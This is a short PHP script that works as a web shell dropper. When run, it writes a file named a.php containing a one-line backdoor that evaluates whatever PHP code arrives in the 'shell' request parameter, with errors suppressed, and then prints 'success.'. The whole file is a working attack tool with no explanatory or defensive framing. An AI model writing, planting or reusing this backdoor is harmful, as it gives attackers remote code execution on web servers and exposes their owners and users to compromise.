<?php
$a = "<?php @eval(\$_REQUEST['shell'])?>";
$b = fopen("a.php","w") or die("failed!");
fwrite($b,$a);
echo 'success.';
fclose($b);
?>
